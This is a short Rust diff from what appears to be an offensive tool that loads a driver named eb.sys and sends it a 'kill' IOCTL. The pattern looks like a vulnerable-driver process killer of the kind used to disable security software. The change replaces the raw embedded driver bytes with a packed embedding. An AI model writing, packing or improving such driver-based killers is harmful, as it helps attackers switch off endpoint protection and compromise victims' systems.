@@ -1,4 +1,5 @@
 use std::ptr::null_mut;
+use include_packed::include_packed;
 
 use winapi::{
     ctypes::c_void, 
@@ -18,8 +19,6 @@ const VERSION: &str = "0.0.1";
 
 const DRIVER_DEVICE: &str = "\\\\.\\eb";
 const IOCTL_KILL: u32 = 0x222024;
-
-static DRIVER: &'static [u8] = include_bytes!("../../../drivers/eb.sys");
 
 pub struct UnknownDriver {
     device: *mut c_void
@@ -78,7 +77,7 @@ impl KillerDriver for UnknownDriver {
     }
 
     fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
-        let v = DRIVER.to_vec();
+        let v = include_packed!("drivers/eb.sys");
         return Ok(v);
     }
 
